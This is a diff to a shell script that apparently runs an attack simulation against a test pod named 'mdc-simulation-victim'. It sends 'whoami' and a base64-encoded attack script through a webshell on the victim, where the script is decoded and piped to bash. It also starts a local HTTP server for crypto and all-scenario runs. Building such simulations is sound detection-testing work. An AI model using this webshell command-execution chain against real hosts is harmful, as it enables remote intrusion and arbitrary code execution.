@@ -17,21 +17,19 @@ case $SCENARIO in
         attack_script=secrets-and-files.sh
         ;;
     crypto)
-        envsubst '${NAME}' < crypto.sh > attack_script.sh
-        attack_script=attack_script.sh
+        attack_script=crypto.sh
         python3 -m http.server 80 > /dev/null 2>&1 &
         sleep 2
         ;;
     all)
-        envsubst '${NAME}' < all-scenarios.sh > attack_script.sh
-        attack_script=attack_script.sh
+        attack_script=all-scenarios.sh
         python3 -m http.server 80 > /dev/null 2>&1 &
         sleep 2
         ;;
     webshell)
         echo "--- Webshell ---"
         echo "Sending command \"whoami\" to victim"
-        curl -Gs --data-urlencode "cmd=whoami" "http://$NAME-victim/ws.php" | sed '/<!--/,/-->/d'
+        curl -Gs --data-urlencode "cmd=whoami" "http://mdc-simulation-victim/ws.php" | sed '/<!--/,/-->/d'
         echo " "
         echo "--- Simulation completed ---"
         exit
@@ -45,5 +43,5 @@ script_b64=$(cat $attack_script | base64 -w0)
 echo "--- Webshell ---"
 echo "Sending payload request to the victim pod"
 echo " "
-curl -Gs --data-urlencode "cmd=echo $script_b64| base64 -d| bash" "http://$NAME-victim/ws.php" | sed '/<!--/,/-->/d'
+curl -Gs --data-urlencode "cmd=echo $script_b64| base64 -d| bash" "http://mdc-simulation-victim/ws.php"  | sed '/<!--/,/-->/d'
 echo "--- Simulation completed ---"
